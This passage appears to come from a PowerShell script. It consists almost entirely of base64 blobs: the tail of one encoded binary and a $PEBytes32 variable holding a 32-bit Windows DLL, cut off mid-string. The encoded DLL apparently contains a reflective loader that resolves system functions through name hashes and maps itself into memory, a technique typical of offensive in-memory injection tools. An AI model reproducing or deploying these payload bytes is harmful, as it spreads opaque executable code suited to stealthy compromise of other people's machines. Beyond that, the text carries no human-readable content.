AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAGAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAgAAADAAAIAAAAAAAAAAAAAAAAAAAAEACQQAAEgAAABgMAIAfQEAAAAAAAAAAAAAAAAAAAAAAAA8P3htbCB2ZXJzaW9uPScxLjAnIGVuY29kaW5nPSdVVEYtOCcgc3RhbmRhbG9uZT0neWVzJz8+DQo8YXNzZW1ibHkgeG1sbnM9J3VybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxJyBtYW5pZmVzdFZlcnNpb249JzEuMCc+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSdhc0ludm9rZXInIHVpQWNjZXNzPSdmYWxzZScgLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQBcAAAAkKKoorCiuKLAotii4KLoohCjGKMgo0CjSKNQo1ijYKPAo8ij+KcIqBioKKg4qEioWKhoqHioiKiYqKiouKjIqNio6Kj4qAipGKkoqTipSKlYqQAAACABANgAAABgo2ijcKN4o4CoiKiQqJiooKioqLCouKjAqMio0KjYqOCo6KjwqPioAKkIqRCpGKkgqSipMKk4qUCpSKlQqVipYKloqXCpeKmAqYipkKmYqaCpqKmwqbipwKnIqdCp2Kngqeip8Kn4qQCqCKoQqhiqIKooqjCqOKpAqkiqUKpYqmCqaKpwqniqgKqIqpCqmKqgqqiqsKq4qsCqyKrQqtiq4KroqvCq+KoAqwirEKsYqyCrKKswqzirQKtIq1CrWKtgq2ircKt4q4CriKuQqwAAADABAMAAAABYqmiqeKqIqpiqqKq4qsiq2KroqviqCKsYqyirOKtIq1iraKt4q4irmKuoq7iryKvYq+ir+KsIrBisKKw4rEisWKxorHisiKyYrKisuKzIrNis6Kz4rAitGK0orTitSK1YrWiteK2IrZitqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrxivKK84r0ivWK9or3iviK+Yr6ivuK/Ir9iv6K/4rwAAAEABAAgCAAAIoBigKKA4oEigWKBooHigiKCYoKiguKDIoNig6KD4oAihGKEooTihSKFYoWiheKGIoZihqKG4ocih2KHoofihCKIYoiiiOKJIoliiaKJ4ooiimKKooriiyKLYouii+KIIoxijKKM4o0ijWKNoo3ijiKOYo6ijuKPIo9ij6KP4owikGKQopDikSKRYpGikeKSIpJikqKS4pMik2KTopPikCKUYpSilOKVIpVilaKV4pYilmKWopbilyKXYpeil+KUIphimKKY4pkimWKZopnimiKaYpqimuKbIptim6Kb4pginGKcopzinSKdYp2ineKeIp5inqKe4p8in2Kfop/inCKgYqCioOKhIqFioaKh4qIiokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqEKogqjCqQKpQqmCqcKqAqpCqoKqwqsCq0KrgqvCqAKsQqyCrMKtAq1CrYKtwq4CrkKugq7CrwKvQq+Cr8KsArBCsIKwwrECsUKxgrHCsgKyQrKCssKzArNCs4KzwrACtEK0grTCtQK1QrWCtcK2ArZCtoK2wrcCt0K3grfCtAK4QriCuMK5ArlCuYK5wroCukK6grrCuwK7QruCu8K4ArxCvIK8wr0CvUK9gr3CvgK+Qr6CvsK/Ar9Cv4K/wrwBQAQDkAAAAAKAQoCCgMKBAoFCgYKBwoICgkKCgoLCgwKDQoOCg8KAAoRChIKEwoUChUKFgoXChgKGQoaChsKHAodCh4KHwoQCiEKIgojCiQKJQomCicKKAopCioKKwosCi0KLgovCiAKMQoyCjMKNAo1CjYKNwo4CjkKOgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKYAAABgAQAUAAAA6K0grsiu0K7YruCuAHABAAwAAADoqQAAAKABAMAAAAAQoCCgIK0wrTitQK1IrVCtWK1grWitcK14rYCtiK2QrZitoK2orbCtuK3Arcit0K3YreCt6K3wrfitAK4IrhCuGK4griiuMK44rkCuSK5QrliuYK5ornCueK6ArpCumK6grqiusK64rsCuyK7Qrtiu4K7orvCu+K4ArwivEK8YryCvKK8wrzivQK9Ir1CvWK9gr2ivcK94r4CviK+Qr5ivoK+or7CvuK/Ar8iv0K/Yr+Cv6K/wrwAAALABAGQAAAA4oFigeKCYoLig8KAIoRChGKEgoWChaKFwoXihgKGIoZChmKGgoaihsKG4odCh2KHgoeih8KH4oQCiCKIQohiiKKIwojiiQKJIolCiWKJgonCieKKAopCisKUAAADgAQAUAAAA0K34rSCuQK5orgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    $PEBytes32 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACJgKGNzeHP3s3hz97N4c/e07Nc3s/hz96LsC7e/+HP3ouwEN7c4c/ei7Av3r/hz94QHgTeyOHP3s3hzt6T4c/ewLMv3szhz97Asy7ezuHP3sCzE97M4c/ewLMU3szhz97AsxHezOHP3lJpY2jN4c/eAAAAAAAAAABQRQAATAEFAJRBuVUAAAAAAAAAAOAAAiELAQwAANwAAADaAAAAAAAAeykAAAAQAAAA8AAAAAAAEAAQAAAAAgAABgAAAAAAAAAGAAAAAAAAAADgAQAABAAAAAAAAAIAQAEAABAAABAAAAAAEAAAEAAAAAAAABAAAABARwEAbQAAALBHAQBQAAAAAMABAOABAAAAAAAAAAAAAAAAAAAAAAAAANABAJwPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALg/AQBAAAAAAAAAAAAAAAAA8AAANAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAAPNsAAAAQAAAA3AAAAAQAAAAAAAAAAAAAAAAAACAAAGAucmRhdGEAAO5dAAAA8AAAAF4AAADgAAAAAAAAAAAAAAAAAABAAABALmRhdGEAAAAsaAAAAFABAABKAAAAPgEAAAAAAAAAAAAAAAAAQAAAwC5yc3JjAAAA4AEAAADAAQAAAgAAAIgBAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAJwPAAAA0AEAABAAAACKAQAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGgw6wAQ6BR6AABZw8zMzMxVi+yLRQxIdBWD6AV1HYtNEIXJdBahgJkBEIkB6w2LRQijgJkBEOigBgAAM8BAXcIMAFWL7IPsMFMzwFZXi/iJReyJReiJffCJReTozwMAAIvYuE1aAABmOQN1F4tDPI1IwIH5vwMAAHcJgTwYUEUAAHQDS+vcZKEwAAAAiV3gx0XYAwAAAMdF0AIAAACLQAzHRdQBAAAAi0AUiUX8hcAPhJUBAACL2ItTKDPJD7dzJIoCwckNPGEPtsByA4PB4APIgcb//wAAQmaF9nXjgflbvEpqD4W3AAAAi3MQagOLRjyLRDB4A8aJRdyLeCCLQCQD/gPGiUX0i130WIlF+IsPA84z0ooBwcoND77AA9BBigGEwHXxgfqOTg7sdBCB+qr8DXx0CIH6VMqvkXVNi0XcD7cLi0AcjQSIgfqOTg7sdQqLBDADxolF7Osigfqq/A18dQqLBDADxolF6OsQgfpUyq+RdQiLBDADxolF8ItF+AX//wAAiUX46wOLRfhqAlmDxwQD2WaFwA+FcP///+t+gfldaPo8dXyLUxCLQjyLRBB4A8KJRdyLXdyLeCCLQCQD+gPCiUX0M8BAiUX4iw8DyjP2igHBzg0PvsAD8EGKAYTAdfGB/rgKTFN1IYtF9A+3CItDHI0EiIsEEAPCiUXki0X4Bf//AACJRfjrA4tF+GoCWQFN9IPHBGaFwHWvi33wi138g33sAHQQg33oAHQKhf90BoN95AB1DYsbiV38hdsPhXD+//+LXeCLczxqQAPzaAAwAACJdfT/dlBqAP/Xi1ZUi/iJffCLy4XSdBEr+4l93IoBiAQPQUp194t98A+3RgYPt04UhcB0N4PBLAPOi1H4SIsxA9eJReAD84tB/IlF3IXAdA6L+IoGiAJCRk9194t98ItF4IPBKIXAddGLdfSLnoAAAAAD34ld+ItDDIXAdHkDx1D/VeyLcxCJRdwD94sDA8eJReCDPgB0T4td3IXAdCKLCIXJeRyLQzwPt8mLRBh4K0wYEItEGByNBIiLBBgDw+sMiwaDwAIDx1BT/1XoiQaDxgSLReCFwHQGg8AEiUXggz4AdbeLXfiLQyCDwxSJXfiFwHWKi3X0i8crRjSDvqQAAAAAiUXcD4SqAAAAi56gAAAAA9+JXeCNSwSLAYlN6IXAD4SPAAAAi3XcixODwPgD19HoiUXcjUMIiUXsdGCLfdyL2A+3C09mi8FmwegMZoP4CnQGZjtF2HULgeH/DwAAATQR6ydmO0XUdRGB4f8PAACLxsHoEGYBBBHrEGY7RdB1CoHh/w8AAGYBNBFqAlgD2IX/da6LffCLXeCLTegDGYld4I1LBIsBiU3ohcAPhXf///+LdfSLdihqAGoAav8D9/9V5P91CDPAQFBX/9Zfi8ZeW4vlXcIEAFWL7ItFBF3DVYvsVv91CIvxg2YEAMdGCAEAAADo0NMAAIkGi8ZeXcIEAFWL7Fb/dQiL8YNmBADHRggBAAAA/xUk8QAQiQaFwHUFOUUIdQeLxl5dwgQAaA4AB4DocdMAAMxqBLiq6gAQ6BgPAACL8WoM6K0GAABZi8iJTfAzwIlF/IXJdAj/dQjoe////4NN/P+JBoXAdQpoDgAHgOgw0wAAi8boyQ4AAMIEAGoEuKrqABDozg4AAIvxagzoYwYAAFmLyIlN8DPAiUX8hcl0CP91COhT////g038/4kGhcB1CmgOAAeA6ObSAACLxuh/DgAAwgQAVYvsVmoIi/FY/3UIZokG/xUk8QAQiUYIhcB1BTlFCHUHi8ZeXcIEAGgOAAeA6KrSAADMiwmFyXQGiwFR/1AIw1aL8YsOhcl0COgbAQAAgyYAXsNR/xUA8QAQw2o8uO3qABDoKQ4AAP91DDP/jU3siX386D//////dRCNTbjGRfwB6Hr///+LNQTxABCNRdhQ/9aNRchQ/9ZqAVdqDMZF/AT/FQjxABCL8Il98I1FuIl16FCNRfBQVv8VDPEAEItd7IXAeQhQaPD6ABDrR4tFCIXAdQpoA0AAgOj+0QAAhdt0BIsT6wKL14sIjX3YV1aD7BCNdciL/GoApWgYAQAAUlClpaX/keQAAACFwHkPUGhI+wAQ6KUMAABZWesS/3Xg6JkMAABZ/3Xo/xUY8QAQizUA8QAQjUXIUP/WjUXYUP/WjUW4UP/Whdt0B4vL6BcAAACDTfz/i0UIhcB0BosIUP9RCOgUDQAAw1aL8VeDz/+NRgjwD8E4T3UQhfZ0DOgMAAAAVugbBQAAWYvHX17DVovxgz4AdAv/Nv8VIPEAEIMmAIN+BAB0Df92BOj0BAAAg2YEAFlew1WL7IHsCAEAAKEAiAEQM8WJRfyAPYiZARABU1ZXD4QSBAAAM9vGBYiZARABaNjxABCNjQT///+JnST///+JnRj///+JnRT///+JnSz///+JnSD////oW/3//2js8QAQjY0c////iZ0w////6EX9//+NhST///+JnSj///9QaJjxABBoePEAEOgZ0wAAi70c////hcB5ElBoEPIAEOhmCwAAWVnp8QIAAIuFJP///42VDP///4mdDP///1JQiwj/URSFwA+IpAAAAGoyXom1CP///4mdEP///+tpi4UQ////jZUc////UomdHP///2io8QAQiwhQ/xGFwHg8i4Uc////jZUI////Uo1VmFKLCFD/UQyFwHgVVo1FmFCNhTT///9WUOghCgAAg8QQi4Uc////UIsI/1EIi4UQ////UIsI/1EIi4UM////jZUQ////U1JqAYsIUP9RDIXAD4R5////i4UM////UIsI/1EIi4Uk////jZUY////Umio8QAQjZU0////iwhSUP9RDIXAeQtQaGDyABDpAf///4uFGP///42VAP///1JQiwj/USiFwHkLUGjA8gAQ6d/+//85nQD///91D2go8wAQ6DgKAADpzv7//4uFGP///42VFP///1JouPEAEGjI8QAQiwhQ/1EkhcB5C1BogPMAEOmc/v//i4UU////UIsI/1EohcB5C1Bo6PMAEOmB/v//i4Us////hcB0BosIUP9RCIuFFP///42VLP///4mdLP///1JQiwj/UTSFwHkLUGgw9AAQ6Un+//+LtSz///+F9g+E5QEAAIuFIP///4XAdAaLCFD/UQiNjSD///+JnSD///+LBlFoiPEAEFb/EIXAeQtQaKD0ABDpBf7//42F+P7//4md/P7//1BqAb4AOAAAahGJtfj+////FRzxABCL2FP/FRTxABBWaABQARD/cwzoNQIAAIPEDFP/FRDxABCLtSD///+F9g+EXgEAAIuFMP///4XAdAaLCFD/UQiDpTD///8AjY0w////iwZRU1b/kLQAAACFwHkRUGgA9QAQ6OgIAABZWTPb63SLtTD///+F9g+EEwEAAIuFKP///4XAdAaLCFD/UQgz24mdKP///4X/dASLD+sCi8uLBo2VKP///1JRVv9QRIXAeQtQaFj1ABDpKv3//4uFKP///2i49QAQaNz6ABBRi8yJAYXAdAaLCFD/UQToDvv//4PEDIuNJP///4XJdAyLAVH/UAiJnST///+LjRj///+FyXQMiwFR/1AIiZ0Y////i40U////hcl0DIsBUf9QCImdFP///4uFKP///4XAdAaLCFD/UQiF/3QHi8/ovPv//4uFMP///4XAdAaLCFD/UQiLjQT///+FyXQF6J37//+LhSD///+FwHQGiwhQ/1EIi4Us////hcB0BosIUP9RCItN/F9eM81b6HQIAACL5V3DaANAAIDo1cwAAMxVi+xW/3UIi/HoaRAAAMcGnPsAEIvGXl3CBADHAZz7ABDpdBAAAFWL7IPsEOsN/3UI6C4RAABZhcB0Ef91COhiDwAAWYXAdOaL5V3DagGNRfzHRfyk+wAQUI1N8Oj7DwAAaNhBARCNRfDHRfCc+wAQUOghEQAAzFWL7FaL8ccGnPsAEOgSEAAA9kUIAXQHVugIAAAAWYvGXl3CBADppBEAAMzMzMzMzMzMzMzMzMzMzMzMzMxXVot0JBCLTCQUi3wkDIvBi9EDxjv+dgg7+A+CaAMAAA+6JaSZARABcwfzpOkXAwAAgfmAAAAAD4LOAQAAi8czxqkPAAAAdQ4PuiUIiAEQAQ+C2gQAAA+6JaSZARAAD4OnAQAA98cDAAAAD4W4AQAA98YDAAAAD4WXAQAAD7rnAnMNiwaD6QSNdgSJB41/BA+65wNzEfMPfg6D6QiNdghmD9YPjX8I98YHAAAAdGMPuuYDD4OyAAAAZg9vTvSNdvRmD29eEIPpMGYPb0YgZg9vbjCNdjCD+TBmD2/TZg86D9kMZg9/H2YPb+BmDzoPwgxmD39HEGYPb81mDzoP7AxmD39vII1/MH23jXYM6a8AAABmD29O+I12+I1JAGYPb14Qg+kwZg9vRiBmD29uMI12MIP5MGYPb9NmDzoP2QhmD38fZg9v4GYPOg/CCGYPf0cQZg9vzWYPOg/sCGYPf28gjX8wfbeNdgjrVmYPb078jXb8i/9mD29eEIPpMGYPb0YgZg9vbjCNdjCD+TBmD2/TZg86D9kEZg9/H2YPb+BmDzoPwgRmD39HEGYPb81mDzoP7ARmD39vII1/MH23jXYEg/kQfBPzD28Og+kQjXYQZg9/D41/EOvoD7rhAnMNiwaD6QSNdgSJB41/BA+64QNzEfMPfg6D6QiNdghmD9YPjX8IiwSNGB8AEP/g98cDAAAAdRXB6QKD4gOD+QhyKvOl/ySVGB8AEJCLx7oDAAAAg+kEcgyD4AMDyP8khSweABD/JI0oHwAQkP8kjaweABCQPB4AEGgeABCMHgAQI9GKBogHikYBiEcBikYCwekCiEcCg8YDg8cDg/kIcszzpf8klRgfABCNSQAj0YoGiAeKRgHB6QKIRwGDxgKDxwKD+QhypvOl/ySVGB8AEJAj0YoGiAeDxgHB6QKDxwGD+QhyiPOl/ySVGB8AEI1JAA8fABD8HgAQ9B4AEOweABDkHgAQ3B4AENQeABDMHgAQi0SO5IlEj+SLRI7oiUSP6ItEjuyJRI/si0SO8IlEj/CLRI70iUSP9ItEjviJRI/4i0SO/IlEj/yNBI0AAAAAA/AD+P8klRgfABCL/ygfABAwHwAQPB8AEFAfABCLRCQMXl/DkIoGiAeLRCQMXl/DkIoGiAeKRgGIRwGLRCQMXl/DjUkAigaIB4pGAYhHAYpGAohHAotEJAxeX8OQjXQx/I18Ofz3xwMAAAB1JMHpAoPiA4P5CHIN/fOl/P8klbQgABCL//fZ/ySNZCAAEI1JAIvHugMAAACD+QRyDIPgAyvI/ySFuB8AEP8kjbQgABCQyB8AEOwfABAUIAAQikYDI9GIRwOD7gHB6QKD7wGD+Qhysv3zpfz/JJW0IAAQjUkAikYDI9GIRwOKRgLB6QKIRwKD7gKD7wKD+QhyiP3zpfz/JJW0IAAQkIpGAyPRiEcDikYCiEcCikYBwekCiEcBg+4Dg+8Dg/kID4JW/////fOl/P8klbQgABCNSQBoIAAQcCAAEHggABCAIAAQiCAAEJAgABCYIAAQqyAAEItEjhyJRI8ci0SOGIlEjxiLRI4UiUSPFItEjhCJRI8Qi0SODIlEjwyLRI4IiUSPCItEjgSJRI8EjQSNAAAAAAPwA/j/JJW0IAAQi//EIAAQzCAAENwgABDwIAAQi0QkDF5fw5CKRgOIRwOLRCQMXl/DjUkAikYDiEcDikYCiEcCi0QkDF5fw5CKRgOIRwOKRgKIRwKKRgGIRwGLRCQMXl/DjaQkAAAAAFeLxoPgD4XAD4XSAAAAi9GD4X/B6gd0ZY2kJAAAAACQZg9vBmYPb04QZg9vViBmD29eMGYPfwdmD39PEGYPf1cgZg9/XzBmD29mQGYPb25QZg9vdmBmD29+cGYPf2dAZg9/b1BmD393YGYPf39wjbaAAAAAjb+AAAAASnWjhcl0T4vRweoEhdJ0F42bAAAAAGYPbwZmD38HjXYQjX8QSnXvg+EPdCqLwcHpAnQNixaJF412BI1/BEl184vIg+EDdA+KBogHRkdJdfeNmwAAAABYXl/DjaQkAAAAAOsDzMzMuhAAAAAr0CvKUYvCi8iD4QN0CYoWiBdGR0l198HoAnQNixaJF412BI1/BEh181np+v7//1WL7ItVFItNCFaF0nUNhcl1DTlNDHUmM8DrM4XJdB6LRQyFwHQXhdJ1BzPAZokB6+aLdRCF9nUZM8BmiQHoiA4AAGoWXokw6A8OAACLxl5dw1OL2VeL+IP6/3UWK94PtwZmiQQzjXYCZoXAdCVPde7rICvxD7cEHmaJA41bAmaFwHQGT3QDSnXrhdJ1BTPAZokDhf9fWw+Fe////4P6/3UPi0UMM9JqUGaJVEH+WOueM8BmiQHoEA4AAGoi64ZqDGgwQgEQ6BIeAAAz/4l95DPAOUUID5XAhcB1FejqDQAAxwAWAAAA6HANAACDyP/rYejDDgAAg8AgUGoB6P0OAABZWYl9/OiuDgAAg8AgUOiyDwAAWYvwjUUMUFf/dQjolQ4AAIPAIFDoyBAAAIv4iX3k6IIOAACDwCBQVuhUDwAAg8QYx0X8/v///+gLAAAAi8foyx0AAMOLfeToWQ4AAIPAIFBqAej9DgAAWVnDOw0AiAEQdQLzw+mRHwAAi030ZIkNAAAAAFlfX15bi+VdUcNQZP81AAAAAI1EJAwrZCQMU1ZXiSiL6KEAiAEQM8VQ/3X8x0X8/////41F9GSjAAAAAMNQZP81AAAAAI1EJAwrZCQMU1ZXiSiL6KEAiAEQM8VQiWXw/3X8x0X8/////41F9GSjAAAAAMNVi+xW/It1DItOCDPO6GL///9qAFb/dhT/dgxqAP91EP92EP91COiFMAAAg8QgXl3DVYvsUVP8i0UMi0gIM00M6C////+LRQiLQASD4GZ0EYtFDMdAJAEAAAAzwEDrbOtqagGLRQz/cBiLRQz/cBSLRQz/cAxqAP91EItFDP9wEP91COgoMAAAg8Qgi0UMg3gkAHUL/3UI/3UM6B8CAABqAGoAagBqAGoAjUX8UGgjAQAA6IAAAACDxByLRfyLXQyLYxyLayD/4DPAQFuL5V3DVYvsg+wYoQCIARCNTeiDZegAM8GLTQiJRfCLRQyJRfSLRRRAx0XsHSQAEIlN+IlF/GShAAAAAIlF6I1F6GSjAAAAAP91GFH/dRDoNCIAAIvIi0XoZKMAAAAAi8GL5V3DWFmHBCT/4FWL7IPsOFOBfQgjAQAAdRK4/SUAEItNDIkBM8BA6bAAAACDZcgAx0XMTiQAEKEAiAEQjU3IM8GJRdCLRRiJRdSLRQyJRdiLRRyJRdyLRSCJReCDZeQAg2XoAINl7ACJZeSJbehkoQAAAACJRciNRchkowAAAADHRfwBAAAAi0UIiUXwi0UQiUX06LUfAACLgIAAAACJRfiNRfBQi0UI/zD/VfhZWYNl/ACDfewAdBdkix0AAAAAiwOLXciJA2SJHQAAAADrCYtFyGSjAAAAAItF/FuL5V3DVYvsUVGLRQhTi10MVotwDItIEIlN+Il1/FeL/oXbeDOLVRCD/v91C+hkIQAAi034i1UQTmvGFDlUCAR9BjtUCAh+BYP+/3UHi338S4l1/IXbedCLRRRGiTCLRRiJOItFCDt4DHcEO/d2COgiIQAAi034a8YUX15bA8GL5V3DVYvsUVOLRQyDwAyJRfxkix0AAAAAiwNkowAAAACLRQiLXQyLbfyLY/z/4FuL5V3CCABVi+xRUVNWV2SLNQAAAACJdfjHRfwFJwAQagD/dQz/dfz/dQj/FRzwABCLRQyLQASD4P2LTQyJQQRkiz0AAAAAi134iTtkiR0AAAAAX15bi+VdwggAVYvsi00MVot1CIkO6FYeAACLiJgAAACJTgToSB4AAImwmAAAAIvGXl3DVYvsVug0HgAAi3UIO7CYAAAAdRHoJB4AAItOBImImAAAAF5dw+gTHgAAi4iYAAAA6wmLQQQ78HQPi8iDeQQAdfFeXekaIAAAi0YEiUEE69JVi+zo5R0AAIuAmAAAAIXAdA6LTQg5CHQMi0AEhcB19TPAQF3DM8Bdw1WL7IPsCFNWV/yJRfwzwFBQUP91/P91FP91EP91DP91COjULAAAg8QgiUX4X15bi0X4i+Vdw2oIaFBCARDo6xgAAItFDIP4AXV66FczAACFwHUHM8DpRgEAAOifHgAAhcB1B+hTMwAA6+noHD8AAP8VIPAAEKMouAEQ6PY5AACjlJkBEOg6MwAAhcB5B+jiHgAA68/oMDYAAIXAeCDoVjgAAIXAeBdqAOiQMAAAWYXAdQv/BZCZARDp4AAAAOi1NQAA68mFwHVloZCZARCFwH6CSKOQmQEQg2X8AIM9CJ0BEAB1BehFMAAA6BcvAACLdRCF9nUP6H01AADodR4AAOi3MgAAx0X8/v///+gIAAAA6YgAAACLdRCF9nUOgz0AjAEQ/3QF6EoeAADD63CD+AJ1Xv81AIwBEOgCOgAAWYXAdVtovAMAAGoB6GQ9AABZWYvwhfYPhPn+//9W/zUAjAEQ6Pg5AABZWYXAdBhqAFbo1xwAAFlZ/xUk8AAQiQaDTgT/6xlW6BQEAABZ6cP+//+D+AN1CGoA6PIbAABZM8BA6M0XAADCDABVi+yDfQwBdQXoIzgAAP91EP91DP91COgHAAAAg8QMXcIMAGoMaHBCARDoVhcAADPAQIt1DIX2dQw5NZCZARAPhOQAAACDZfwAg/4BdAWD/gJ1NYsNtPsAEIXJdAz/dRBW/3UI/9GJReSFwA+EsQAAAP91EFb/dQjoEf7//4lF5IXAD4SaAAAAi10QU1b/dQjoAOb//4v4iX3kg/4BdSiF/3UkU1D/dQjo6OX//1NX/3UI6Nf9//+htPsAEIXAdAdTV/91CP/QhfZ0BYP+A3UqU1b/dQjotP3///fYG8Aj+Il95HQVobT7ABCFwHQMU1b/dQj/0Iv4iX3kx0X8/v///4vH6yaLTeyLAVH/MP91EP91DP91COgWAAAAg8QUw4tl6MdF/P7///8zwOiaFgAAw1WL7IN9DAF1Df91EGoA/3UI6Ef9////dRj/dRTooywAAFlZXcNVi+xWi3UIg/7gd29TV6EUnQEQhcB1HeixPAAAah7oBz0AAGj/AAAA6MQsAAChFJ0BEFlZhfZ0BIvO6wMzyUFRagBQ/xUo8AAQi/iF/3UmagxbOQVYpQEQdA1W6F8BAABZhcB1qesH6LEFAACJGOiqBQAAiRiLx19b6xRW6D4BAABZ6JYFAADHAAwAAAAzwF5dw1WL7ItFCFaL8YNmBADHBrz7ABDGRggA/zDoqAAAAIvGXl3CBABVi+yLRQjHAbz7ABCLAIlBBIvBxkEIAF3CCABVi+xW/3UIi/GDZgQAxwa8+wAQxkYIAOgSAAAAi8ZeXcIEAMcBvPsAEOmWAAAAVYvsVleLfQiL8Tv3dB3ogwAAAIB/CAB0DP93BIvO6DUAAADrBotHBIlGBF+Lxl5dwgQAVYvsVovxxwa8+wAQ6FIAAAD2RQgBdAdW6Kfv//9Zi8ZeXcIEAFWL7IN9CABTi9l0LVf/dQjo0j0AAI14AVfoiv7//4lDBFlZhcB0Ef91CFdQ6F49AACDxAzGQwgBX1tdwgQAVovxgH4IAHQJ/3YE6PkAAABZg2YEAMZGCABew4tBBIXAdQW4xPsAEMNVi+z/NZyZARD/FTDwABCFwHQP/3UI/9BZhcB0BTPAQF3DM8Bdw1WL7ItFCKOcmQEQXcNVi+yD7CBWV2oIWb7Y+wAQjX3g86WLdQyLfQiF9nQT9gYQdA6LD4PpBFGLAYtwGP9QIIl9+Il1/IX2dAz2Bgh0B8dF9ABAmQGNRfRQ/3Xw/3Xk/3Xg/xU08AAQX16L5V3CCABRxwH8+wAQ6Ho/AABZw1WL7I1BCVCLRQiDwAlQ6Nk+AAD32FkbwFlAXcIEAFWL7FaL8ejJ////9kUIAXQHVuhf7v//WYvGXl3CBABVi+yDfQgAdC3/dQhqAP81FJ0BEP8VPPAAEIXAdRhW6FkDAACL8P8VOPAAEFDoXgMAAFmJBl5dw1WL7IMloJkBEACD7BxTM9tDCR0IiAEQagroxbwAAIXAD4RMAQAAM8mJHaCZARAzwA+iVos1CIgBEFeNfeSDzgKJB4lfBIlPCIlXDItF5ItN8IlF9IHxaW5lSYtF7DVudGVsiTUIiAEQC8iLReg1R2VudQvI99lqARrJWP7BagBZD6KJB4lfBIlPCIlXDItN7IlN+HRDi0XkJfA//w89wAYBAHQjPWAGAgB0HD1wBgIAdBU9UAYDAHQOPWAGAwB0Bz1wBgMAdRGLPaSZARCDzwGJPaSZARDrBos9pJkBEIN99Ad8NWoHM8mNdeRYD6KJBovGizUIiAEQiVgEiUgIi034iVAMi0XoqQACAAB0DYPPAok9pJkBEOsCM8D3wQAAEAB0TYPOBMcFoJkBEAIAAACJNQiIARD3wQAAAAh0MvfBAAAAEHQqg84IxwWgmQEQAwAAAIk1CIgBEKggdBODziDHBaCZARAFAAAAiTUIiAEQX14zwFuL5V3DVYvsgewoAwAAoQCIARAzxYlF/IN9CP9XdAn/dQjo2T0AAFmDpeD8//8AjYXk/P//akxqAFDo1D0AAI2F4Pz//4PEDImF2Pz//42FMP3//4mF3Pz//4mF4P3//4mN3P3//4mV2P3//4md1P3//4m10P3//4m9zP3//2aMlfj9//9mjI3s/f//ZoydyP3//2aMhcT9//9mjKXA/f//ZoytvP3//5yPhfD9//+LRQSJhej9//+NRQSJhfT9///HhTD9//8BAAEAi0D8iYXk/f//i0UMiYXg/P//i0UQiYXk/P//i0UEiYXs/P///xVE8AAQi/iNhdj8//9Q6E82AABZhcB1E4X/dQ+DfQj/dAn/dQjo5jwAAFmLTfwzzV/oTvP//4vlXcNVi+yLRQijqJkBEF3DVYvs/zWomQEQ/xUw8AAQhcB0A13/4P91GP91FP91EP91DP91COgRAAAAzDPAUFBQUFDoyf///4PEFMNqF+j2uQAAhcB0BWoFWc0pVmoBvhcEAMBWagLoc/7//1bopTUAAIPEEF7D6PAUAACFwHUGuHyJARDDg8AMw1WL7Fbo5P///4